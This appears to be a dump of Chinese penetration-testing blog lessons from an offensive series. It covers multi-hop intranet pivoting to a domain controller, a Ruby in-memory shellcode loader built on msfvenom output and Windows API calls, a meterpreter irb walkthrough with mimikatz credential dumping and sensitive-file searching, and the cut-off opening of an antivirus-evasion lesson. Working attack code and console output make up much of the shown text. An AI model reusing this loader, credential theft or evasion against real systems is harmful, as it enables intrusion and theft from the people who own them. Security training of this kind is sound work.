src="../do/media/a5b217214c10db82110bcb34a166a53f.jpg" alt></p><ul><li><p>A1对内信息搜集发现A2，并且针对A1，没有可用提权漏洞（Web非root权限），放弃提权：<br><img src="../do/media/7f18b933fee393c1150a36f603ca5aac.jpg" alt></p></li><li><p>以A1作为跳板添加虚拟路由，并且开始做针对A2的对内信息搜集：<br><img src="../do/media/3d57cf1f1005ba4254aa57971286df86.jpg" alt></p></li></ul><p><img src="../do/media/9977d347d014885a6b6f051ecf337acd.jpg" alt></p><ul><li>以A1跳板发现A2部署weblogic，并且存在漏洞。转发目标机7001至本地，利用漏洞。<br><img src="../do/media/278d82913ceca2d619234f4a602c908d.jpg" alt></li></ul><p><img src="../do/media/e3ee48eafcd1322980a2a2b4dbc81161.jpg" alt></p><p><img src="../do/media/ec698d2c28ce34078f6fb28955826036.jpg" alt></p><ul><li><p>发现A2全补丁，放弃提权，（weblogic为user权限）对内信息刺探A2，得到 weblogic相关配置文件，解密后，得到密码。<br><img src="../do/media/48ce8cfde97da6cc01a6310c13c93eba.jpg" alt></p></li><li><p>尝试做二级跳板，以weblogic相关配置，尝试对B（域内成员）的渗透（SMB）<br><img src="../do/media/b033dbb98df945e1629016daa8f715fa.jpg" alt></p></li><li><p>获取B权限（system），尝试对内B的本身信息搜集，发现域账号（普通成员）user1.<br><img src="../do/media/e6619fad61ae8258bbf571a061816eab.jpg" alt></p></li></ul><h3 id="引言（2）："><a href="#引言（2）：" class="headerlink" title="引言（2）："></a>引言（2）：</h3><p><strong>渗透测试过程，提权是非核心任务，这里也不建议尝试提权，因为在实战过程中获取某个“点”的权限，过程是及其漫长以及困难的，不要因为某个大胆的尝试，而影响了整个渗透测试流程。</strong>  </p><ul><li>尝试三级跳板，尝试获取sid，以及域控对内相关IP，尝试越权，获取域控权限。<br><img src="../do/media/75a390348d0d82d12b741b71cc1077d4.jpg" alt>  </li></ul><p><img src="../do/media/95e9d4bd457a3854dc2a181854aff847.jpg" alt></p><p><img src="../do/media/1731a21414be63725aad1c9bc5f6e2ab.jpg" alt></p><p><img src="../do/media/3fc9121169f8810f044902ea33ee6746.jpg" alt></p><p><strong>并没有结束：</strong>  </p><blockquote><p>  在得到域控后，对主机C对内信息搜集，得到域控administrator密码，尝试用该密码 ssh—&gt;A1，成功，root权限。</p></blockquote><p>广告（你需要背下来的广告词）：<strong>只要是“一个人”设置的密码“群”，一定有大的规律，只要是“一个行业”设置的密码“群”一定有规律可寻。</strong></p><h3 id="引言（4）："><a href="#引言（4）：" class="headerlink" title="引言（4）："></a>引言（4）：</h3><p><strong>渗透的本质是信息搜集，而要把信息搜集发挥最大效果，一定是离不开“线索关联”，而信息搜集，无论是对内，对外，更或者是主动信息搜集，被动信息搜集。如何把目标A与B的信息搜集，整理后做“线索关联”是一个非常有趣的工作。</strong></p><h3 id="后者的话："><a href="#后者的话：" class="headerlink" title="后者的话："></a>后者的话：</h3><p>APT攻击三大要素，既：  </p><ul><li>攻击手段复杂，持续时间长，高危害性</li></ul><p>APT攻击主要分类为两大类，既：  </p><ul><li>高级持续渗透 ， 即时渗透</li></ul><p><img src="../do/media/8114a948743a1acaf2b03562c850e7e6.jpg" alt></p><p><img src="../do/media/8017d7d0aec4b49eb5a2bb73f23ab555.jpg" alt></p><p><img src="../do/media/f8933631951866360ec8f45717feb0ce.jpg" alt></p><p><img src="../do/media/9233e8ff54bca67e6d94c588116c541a.jpg" alt></p><h3 id="APT两大类攻击核心诉求区别："><a href="#APT两大类攻击核心诉求区别：" class="headerlink" title="APT两大类攻击核心诉求区别："></a>APT两大类攻击核心诉求区别：</h3><p><img src="../do/media/9334e9c3f86f584e6846e907ed5e1102.jpg" alt></p><p>在做调研之前，作者一直以为越发达的城市，或者越政治中心的城市是发生攻击的高发地，但是在调研后，打破了我之前的想法，于是作者深入调研原因究竟，以便更好的了解企业安全建设的规划。<br><img src="../do/media/cf5a7e83b5ce618b69373b15233eaf41.jpg" alt></p><p><img src="../do/media/7e8216bd52b30af1c5d036552138ab49.jpg" alt></p><p><img src="../do/media/86c77171801811fd8339cb4ed6e7e8fe.jpg" alt></p><p>在针对政府机构的攻击中，APT组织除了会攻击一般的政府机构外，还有专门针对公检法的攻击。</p><p>在针对能源行业的攻击中，APT组织重点关注的领域依次是：石油、天然气和核能。针对能源行业的攻击，对国家安全具有很大的影响。</p><p>在针对金融行业的攻击中，APT组织最为关注的是银行，其次是证券、互联网金融等。还有部分APT组织会关注到与虚拟数字货币（如比特币、门罗币等）相关的机构或公司。针对金融机构的攻击大多会利用安全漏洞。针对ATM自动取款机的攻击也一直延续了2016年的活跃状态。</p><p>还有一点值得注意：APT组织的攻击虽然具有很强的针对性，但其攻击目标也并不一定是单一的。有的APT组织只攻击特定国家特定领域的目标（仅从目前已经披露的情况看），但也有很多APT组织会对多个国家的不同领域目标展开攻击。上图给出了2017年全球各国研究机构发布的APT研究报告中，披露APT组织攻击目标的所属国家、领域数量分析。</p><h3 id="引言（5）："><a href="#引言（5）：" class="headerlink" title="引言（5）："></a>引言（5）：</h3><p><strong>目前市场上的企业网络安全规划与建设大部分存在统一实施方案，或者是模板方案。而非针对特定行业，特定客户群体来制定针对方案。而不同行业，不同背景的企业安全规划方案也一定是不相同的。如传统行业（医药，食品，汽车）对待企业安全的建设是起跑阶段。如金融行业（证券，银行，保险）对待企业安全的建设是规划与实施阶段。如互联网行业（某度，某巴，某鹅）对待企业安全建设是自研或商业化阶段。为了更好的了解，所以如上制图，更能清楚的看到，未来企业网络安全对待企业发展的重要性，以及特定行业特定规划方案，特定行业特定防御对象。如某X企业安全预算为100万，是否应该针对该企业，行业，地理位置，做防御预算倾斜，并且留有10%-15%的资金量做2月，3月，11月攻击高发期的预案资金等。</strong></p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p><strong>由于信息化，自动化的办公，企业成本的考虑，传统的“以点打面”的点会越来越分散与难以集中管理，如跨国办公，移动办公等。那么可预知的攻击方式将会以人为突破口的事越来越多。安全的本质又不能仅仅靠预算与设备的投入而杜绝，尤其是在未来的大型甲方公司，都会有着自己的安全团队，那么如何把网络安全发展成未来甲方公司的企业文化，将会是一个漫长的过程。而近些年无论是国内还是国外的官方部门开始重视网络安全，但是效果不明显，这里做一个总结，同样部分也适用于企业：</strong></p><p><img src="../do/media/497fa9474fd0ae6063d5386ab214d69e.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>68、基于Ruby内存加载shellcode第一季</title>
      <link href="/article/68_%E5%9F%BA%E4%BA%8ERuby%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDshellcode%E7%AC%AC%E4%B8%80%E5%AD%A3.html"/>
      <url>/article/68_%E5%9F%BA%E4%BA%8ERuby%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDshellcode%E7%AC%AC%E4%B8%80%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p>本季是为配合msf在渗透过程中无文件渗透，提前做基础过度。也为msf插件编写做基础过度。</p><h3 id="ruby-shellcode-生成如下："><a href="#ruby-shellcode-生成如下：" class="headerlink" title="ruby shellcode 生成如下："></a>ruby shellcode 生成如下：</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐p windows/messagebox TEXT=Micropoor TITLE=Micropoor ‐f ruby ‐‐smallest</span><br></pre></td></tr></table></figure><p><img src="../do/media/56aa6d4fb31384a6c8f8e972e66f9a2b.jpg" alt></p><p><img src="../do/media/708fd97e6cb1c45afd361b8b53e6ffc5.jpg" alt></p><h3 id="附源码："><a href="#附源码：" class="headerlink" title="附源码："></a>附源码：</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'fiddle'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'fiddle/import'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'fiddle/types'</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># msfvenom ‐p windows/messagebox TEXT=Micropoor TITLE=Micropoor ‐f ruby ‐‐smallest</span></span><br><span class="line">shellcode =</span><br><span class="line"> <span class="string">"\\xd9\\xeb\\x9b\\xd9\\x74\\x24\\xf4\\x31\\xd2\\xb2\\x77\\x31\\xc9\\x64"</span> +</span><br><span class="line"> <span class="string">"\\x8b\\x71\\x30\\x8b\\x76\\x0c\\x8b\\x76\\x1c\\x8b\\x46\\x08\\x8b\\x7e"</span> +</span><br><span class="line"><span class="string">"\\x20\\x8b\\x36\\x38\\x4f\\x18\\x75\\xf3\\x59\\x01\\xd1\\xff\\xe1\\x60"</span> +</span><br><span class="line"><span class="string">"\\x8b\\x6c\\x24\\x24\\x8b\\x45\\x3c\\x8b\\x54\\x28\\x78\\x01\\xea\\x8b"</span></span><br><span class="line"><span class="string">"\\x4a\\x18\\x8b\\x5a\\x20\\x01\\xeb\\xe3\\x34\\x49\\x8b\\x34\\x8b\\x01"</span></span><br><span class="line"><span class="string">"\\xee\\x31\\xff\\x31\\xc0\\xfc\\xac\\x84\\xc0\\x74\\x07\\xc1\\xcf\\x0d"</span></span><br><span class="line"><span class="string">"\\x01\\xc7\\xeb\\xf4\\x3b\\x7c\\x24\\x28\\x75\\xe1\\x8b\\x5a\\x24\\x01"</span></span><br><span class="line"><span class="string">"\\xeb\\x66\\x8b\\x0c\\x4b\\x8b\\x5a\\x1c\\x01\\xeb\\x8b\\x04\\x8b\\x01"</span></span><br><span class="line"><span class="string">"\\xe8\\x89\\x44\\x24\\x1c\\x61\\xc3\\xb2\\x08\\x29\\xd4\\x89\\xe5\\x89"</span></span><br><span class="line"><span class="string">"\\xc2\\x68\\x8e\\x4e\\x0e\\xec\\x52\\xe8\\x9f\\xff\\xff\\xff\\x89\\x45"</span></span><br><span class="line"><span class="string">"\\x04\\xbb\\x7e\\xd8\\xe2\\x73\\x87\\x1c\\x24\\x52\\xe8\\x8e\\xff\\xff"</span></span><br><span class="line"><span class="string">"\\xff\\x89\\x45\\x08\\x68\\x6c\\x6c\\x20\\x41\\x68\\x33\\x32\\x2e\\x64"</span></span><br><span class="line"><span class="string">"\\x68\\x75\\x73\\x65\\x72\\x30\\xdb\\x88\\x5c\\x24\\x0a\\x89\\xe6\\x56"</span></span><br><span class="line"><span class="string">"\\xff\\x55\\x04\\x89\\xc2\\x50\\xbb\\xa8\\xa2\\x4d\\xbc\\x87\\x1c\\x24"</span></span><br><span class="line"><span class="string">"\\x52\\xe8\\x5f\\xff\\xff\\xff\\x68\\x72\\x58\\x20\\x20\\x68\\x6f\\x70"</span></span><br><span class="line"><span class="string">"\\x6f\\x6f\\x68\\x4d\\x69\\x63\\x72\\x31\\xdb\\x88\\x5c\\x24\\x09\\x89"</span></span><br><span class="line"><span class="string">"\\xe3\\x68\\x72\\x58\\x20\\x20\\x68\\x6f\\x70\\x6f\\x6f\\x68\\x4d\\x69"</span></span><br><span class="line"><span class="string">"\\x63\\x72\\x31\\xc9\\x88\\x4c\\x24\\x09\\x89\\xe1\\x31\\xd2\\x52\\x53"</span></span><br><span class="line"><span class="string">"\\x51\\x52\\xff\\xd0\\x31\\xc0\\x50\\xff\\x55\\x08"</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> Fiddle </span><br><span class="line"></span><br><span class="line">kernel32 = Fiddle.dlopen(<span class="string">'kernel32'</span>) </span><br><span class="line"></span><br><span class="line">ptr = Function.new(kernel32[<span class="string">'VirtualAlloc'</span>], [<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(<span class="number">0</span>, shellcode.size, <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">Function.new(kernel32[<span class="string">'VirtualProtect'</span>], [<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(ptr, shellcode.size, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">buf = Fiddle::Pointer[shellcode] </span><br><span class="line"></span><br><span class="line">Function.new(kernel32[<span class="string">'RtlMoveMemory'</span>], [<span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>],<span class="number">4</span>).call(ptr, buf, shellcode.size)</span><br><span class="line"></span><br><span class="line">thread = Function.new(kernel32[<span class="string">'CreateThread'</span>],[<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">Function.new(kernel32[<span class="string">'WaitForSingleObject'</span>], [<span class="number">4</span>,<span class="number">4</span>], <span class="number">4</span>).call(thread, ‐<span class="number">1</span>)</span><br></pre></td></tr></table></figure><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>67、meterpreter下的irb操作第一季</title>
      <link href="/article/67_meterpreter%E4%B8%8B%E7%9A%84irb%E6%93%8D%E4%BD%9C%E7%AC%AC%E4%B8%80%E5%AD%A3.html"/>
      <url>/article/67_meterpreter%E4%B8%8B%E7%9A%84irb%E6%93%8D%E4%BD%9C%E7%AC%AC%E4%B8%80%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>Railgun是Meterpreter stdapi的扩展，允许任意加载DLL。Railgun的最大好处是能够动态访问系统上的整个Windows API。通过从用户进程调用Windows API。</strong><br><img src="../do/media/3887a1136b060d02cc820deceb0610c5.jpg" alt></p><p>meterpreter下执行irb进入ruby交互。</p><p>基本的信息搜集：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; client.sys.config.sysinfo[&apos;OS&apos;]</span><br><span class="line">=&gt; &quot;Windows .NET Server (Build 3790, Service Pack 2).&quot;</span><br><span class="line">&gt;&gt; client.sys.config.getuid</span><br><span class="line">=&gt; &quot;WIN03X64\\Administrator&quot;</span><br><span class="line">&gt;&gt; interfaces = client.net.config.interfaces</span><br><span class="line">=&gt;[#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Interface:0x000055aee92c5770 @index=65539, @mac_addr=&quot;\x00\f)\x85\xD6&#125;&quot;, @mac_name=&quot;Inte l(R) PRO/1000 MT Network Connection&quot;, @mtu=1500, @flags=nil, @addrs=[&quot;19 2.168.1.119&quot;], @netmasks=[&quot;255.255.255.0&quot;], @scopes=[]&gt;, #&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Interface:0x000055aee92c5220 @index=1,@mac_addr=&quot;&quot;, @mac_name=&quot;MS TCP Loopback interface&quot;, @mtu=1520, @flags=ni l,@addrs=[&quot;127.0.0.1&quot;], @netmasks=[], @scopes=[]&gt;]</span><br><span class="line">&gt;&gt; interfaces.each do |i|</span><br><span class="line">?&gt; puts i.pretty</span><br><span class="line">&gt;&gt; end</span><br><span class="line"></span><br><span class="line">Interface 65539</span><br><span class="line"> ============</span><br><span class="line">Name : Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC : 00:0c:29:85:d6:7d</span><br><span class="line">MTU : 1500</span><br><span class="line">IPv4 Address : 192.168.1.119</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">Interface 1</span><br><span class="line"> ============</span><br><span class="line">Name : MS TCP Loopback interface</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU : 1520</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">=&gt;[#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Interface:0x000055aee92c5770 @index=65539, @mac_addr=&quot;\x00\f)\x85\xD6&#125;&quot;, @mac_name=&quot;Inte l(R) PRO/1000 MT Network Connection&quot;, @mtu=1500, @flags=nil, @addrs=[&quot;19 2.168.1.119&quot;], @netmasks=[&quot;255.255.255.0&quot;], @scopes=[]&gt;, #&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Interface:0x000055aee92c5220 @index=1, @mac_addr=&quot;&quot;, @mac_name=&quot;MS TCP Loopback interface&quot;, @mtu=1520, @flags=ni l, @addrs=[&quot;127.0.0.1&quot;], @netmasks=[], @scopes=[]&gt;]</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure><p><img src="../do/media/c699d8499e9ccc7e52378c7a4aab8b16.jpg" alt></p><p>锁定注销目标机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; client.railgun.user32.LockWorkStation()</span><br><span class="line">=&gt; &#123;&quot;GetLastError&quot;=&gt;0, &quot;ErrorMessage&quot;=&gt;&quot;\xB2\xD9\xD7\xF7\xB3\xC9\xB9\xA6\xCD\xEA\xB3\xC9\xA1\xA3&quot;, &quot;return&quot;=&gt;true&#125;</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure><p><img src="../do/media/16c29aa470deb87ea1321eecf1cf97b3.jpg" alt></p><p>调用MessageBox：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; client.railgun.user32.MessageBoxA(0, &quot;Micropoor&quot;, &quot;Micropoor&quot;, &quot;MB_OK&quot;)</span><br></pre></td></tr></table></figure><p><img src="../do/media/f2fa18b3dd40787d8cff662aa133adb6.jpg" alt></p><p>快速获取当前绝对路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; client.fs.dir.pwd</span><br><span class="line">=&gt; &quot;C:\\Documents and Settings\\Administrator\\\xE6\xA1\x8C\xE9\x9D\xA 2&quot;</span><br></pre></td></tr></table></figure><p>目录相关操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; client.fs.dir.chdir(&quot;c:\\&quot;)</span><br><span class="line">=&gt; 0</span><br><span class="line">&gt;&gt; client.fs.dir.entries</span><br><span class="line">=&gt; [&quot;ADFS&quot;, &quot;AUTOEXEC.BAT&quot;, &quot;boot.ini&quot;, &quot;bootfont.bin&quot;, &quot;CONFIG.SYS&quot;, &quot;Documents and Settings&quot;, &quot;Inetpub&quot;, &quot;IO.SYS&quot;, &quot;MSDOS.SYS&quot;, &quot;NTDETECT.CO M&quot;, &quot;ntldr&quot;, &quot;pagefile.sys&quot;, &quot;Program Files&quot;, &quot;Program Files (x86)&quot;, &quot;RECYCLER&quot;, &quot;System Volume Information&quot;, &quot;WINDOWS&quot;, &quot;wmpub&quot;]</span><br></pre></td></tr></table></figure><p>建立文件夹：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; client.fs.dir.mkdir(&quot;Micropoor&quot;)</span><br><span class="line">=&gt; 0</span><br></pre></td></tr></table></figure><p><img src="../do/media/bf1667163d90cf5139ce06d51c5e0d76.jpg" alt></p><p>hash操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; client.core.use &quot;mimikatz&quot;</span><br><span class="line">=&gt; true</span><br><span class="line">&gt;&gt; client.mimikatz</span><br><span class="line">=&gt; #&lt;Rex::Post::Meterpreter::Extensions::Mimikatz::Mimikatz:0x000055aee91ceb28 @client=#&lt;Session:meterpreter 192.168.1.119:53 (192.168.1.119) &quot;WIN03X64\Administrator @ WIN03X64&quot;&gt;, @name=&quot;mimikatz&quot;&gt;</span><br><span class="line">&gt;&gt; client.mimikatz.kerberos</span><br><span class="line">=&gt;[&#123;:authid=&gt;&quot;0;996&quot;, :package=&gt;&quot;Negotiate&quot;, :user=&gt;&quot;NETWORKSERVICE&quot;, :domain=&gt;&quot;NT AUTHORITY&quot;, :password=&gt;&quot;mod_process::getVeryBasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)&quot;&#125;,&#123;:authid=&gt;&quot;0;44482&quot;, :package=&gt;&quot;NTLM&quot;, :user=&gt;&quot;&quot;, :domain=&gt;&quot;&quot;,:password=&gt;&quot;mod_process::getVeryBasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B \x02 \nn.a. (kerberos KO)&quot;&#125;, &#123;:authid=&gt;&quot;0;115231&quot;,:package=\&gt;&quot;NTLM&quot;, :user=&gt;&quot;Administrator&quot;, :domain=&gt;&quot;WIN03X64&quot;,:password=&gt;&quot;mod_process::getVery BasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadPocessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)&quot;&#125;, &#123;:a uthid=&gt;&quot;0;997&quot;,:package=&gt;&quot;Negotiate&quot;, :user=&gt;&quot;LOCAL SERVICE&quot;, :domain=&gt;&quot;NT AUTHORITY&quot;,:password=&gt;&quot;mod_process::getVeryBasicModulesList ForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)&quot;&#125;, &#123;:authid=&gt;&quot;0;999&quot;, package=&gt;&quot;NTLM&quot;,</span><br><span class="line">:user=&gt;&quot;WIN03X64$&quot;, :domain=&gt;&quot;WORKGROUP&quot;, :password=&gt;&quot;mod_process::getVeryBasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)&quot;&#125;]</span><br></pre></td></tr></table></figure><p><img src="../do/media/a03610b1b7f3c56a8905319c9f8ce20f.jpg" alt></p><p>内网主机发现，如路由，arp等：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; client.net.config.arp_table</span><br><span class="line">=&gt; [#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Arp:0x000055aee7f5f6b8 @ip_addr=&quot;192.168.1.1&quot;, @mac_addr=&quot;78:44:fd:8e:91:59&quot;, @interface=&quot;65539&quot;&gt;, #&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Arp:0x000055aee7f5ee20 @ip_addr=&quot;192.168.1.3&quot;, @mac_addr=&quot;28:16:ad:3b:51:78&quot;, @inteface=&quot;65539&quot;&gt;]</span><br><span class="line">&gt;&gt; client.net.config.arp_table[0].ip_addr</span><br><span class="line">&gt;&gt; =&gt; &quot;192.168.1.1&quot;</span><br><span class="line">&gt;&gt; client.net.config.arp_table[0].mac_addr</span><br><span class="line">=&gt; &quot;78:44:fd:8e:91:59&quot;</span><br><span class="line">&gt;&gt; client.net.config.arp_table[0].interface</span><br><span class="line">=&gt; &quot;65539&quot;</span><br><span class="line">&gt;&gt; client.net.config.routes</span><br><span class="line">=&gt; [#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee789be58 @subnet=&quot;0.0.0.0&quot;, @netmask=&quot;0.0.0.0&quot;, @gateway=&quot;192.168.1.1&quot;,</span><br><span class="line">@interface=&quot;65539&quot;, @metric=10&gt;,#&lt;Rex::Post::Meterpreter::Extensions::St</span><br><span class="line">dapi::Net::Route:0x000055aee789a7b0 @subnet=&quot;127.0.0.0&quot;, @netmask=&quot;255.0.0.0&quot;, @gateway=&quot;127.0.0.1&quot;, @interface=&quot;1&quot;, @metric=1&gt;, #&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee78993b0 \@subnet=&quot;192.168.1.0&quot;, @netmask=&quot;255.255.255.0&quot;, @gateway=&quot;192.168.1.119&quot;, @interface=&quot;65539&quot;, @metric=10&gt;, #&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee786fec0 @subnet=&quot;192.168.1.119&quot;, @netmask=&quot;255.255.255.255&quot;, @gateway=&quot;127.0.0.1&quot;, @interface=&quot;1&quot;, @metric=10&gt;,#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee786e9d0 @subnet=&quot;192.168.1.255&quot;, @netmask=&quot;255.255.255.255&quot;, @gateway=&quot;192.168.1.119&quot;, @inte</span><br><span class="line">rface=&quot;65539&quot;, @metric=10&gt;, #&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee786d698 @subnet=&quot;224.0.0.0&quot;, @netmask=&quot;240.0.0.0&quot;, @gateway=&quot;192.168.1.119&quot;, @interface=&quot;65539&quot;, @metric=10&gt;,#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee785be98 @subnet=&quot;255.255.255.255&quot;, @netmask=&quot;255.255.255.255&quot;, @gateway=&quot;192.168.1.119&quot;,</span><br><span class="line">@interface=&quot;65539&quot;, @metric=1&gt;]</span><br></pre></td></tr></table></figure><p><img src="../do/media/117133f26378e67253fb7e0e6fbb8dc3.jpg" alt></p><p><strong>实战中的敏感文件操作，也是目前最稳定，速度最快的方式：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; client.fs.file.search(&quot;C:\\&quot;, &quot;*.txt&quot;)</span><br></pre></td></tr></table></figure><p>更多的敏感文件操作，后续补充。  </p><p><img src="../do/media/f9b76bce304c8f9f4f75d6db4deaccd4.jpg" alt></p><p>更多相关的api操作在未来的课时中介绍。</p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>66、借助aspx对payload进行分离免杀</title>
      <link href="/article/66_%E5%80%9F%E5%8A%A9aspx%E5%AF%B9payload%E8%BF%9B%E8%A1%8C%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80.html"/>
      <url>/article/66_%E5%80%9F%E5%8A%A9aspx%E5%AF%B9payload%E8%BF%9B%E8%A1%8C%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80.html</url>
      
        <content type="html"><![CDATA[<p><strong>关于分离免杀，其他章节参考：</strong>  </p><ul><li>68课时payload特征，行为分离免杀思路第一季  </li><li>69课时payload分离免杀思路第二季</li></ul><p>本季针对目标环境支持aspx进行分离免杀。</p><p><strong>靶机背景：</strong>  </p><ul><li>Windows 2003   </li><li>Debian</li></ul><p>Windows 2003：<br><img src="../do/media/9104a6f1137ab57d036f0991e729abf9.jpg" alt>  </p><p><img src="../do/media/2182d6d13212bb3cde601fe2599b1881.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 